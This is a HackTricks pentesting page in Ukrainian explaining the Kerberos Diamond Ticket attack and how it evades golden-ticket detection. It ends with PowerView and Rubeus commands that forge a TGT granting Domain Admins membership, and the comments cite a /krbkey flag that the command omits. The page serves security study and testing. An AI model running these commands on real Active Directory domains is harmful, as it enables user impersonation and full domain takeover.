# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Як золотий квиток**, діамантовий квиток - це TGT, який можна використовувати для **доступу до будь-якої служби як будь-який користувач**. Золотий квиток підробляється повністю офлайн, шифрується за допомогою хешу krbtgt цього домену, а потім передається в сеанс входу для використання. Оскільки контролери домену не відстежують TGT, які (або які) вони легітимно видали, вони з радістю приймуть TGT, які зашифровані за допомогою власного хешу krbtgt.

Існує дві поширені техніки для виявлення використання золотих квитків:

- Шукати TGS-REQ, які не мають відповідного AS-REQ.
- Шукати TGT, які мають смішні значення, такі як стандартний 10-річний термін дії Mimikatz.

**Діамантовий квиток** створюється шляхом **модифікації полів легітимного TGT, який був виданий DC**. Це досягається шляхом **запиту** **TGT**, **дешифрування** його за допомогою хешу krbtgt домену, **модифікації** бажаних полів квитка, а потім **повторного шифрування**. Це **переборює дві вищезгадані недоліки** золотого квитка, оскільки:

- TGS-REQ матиме попередній AS-REQ.
- TGT був виданий DC, що означає, що він матиме всі правильні деталі з політики Kerberos домену. Навіть якщо ці деталі можна точно підробити в золотому квитку, це складніше і відкрито для помилок.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
